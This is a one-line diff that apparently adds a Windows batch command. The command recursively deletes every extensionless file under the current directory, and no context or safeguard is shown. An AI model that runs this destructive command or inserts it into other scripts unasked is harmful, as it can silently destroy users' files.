@@ -1,0 +1,1 @@
+for /R %%f in (*.) do del "%%f"
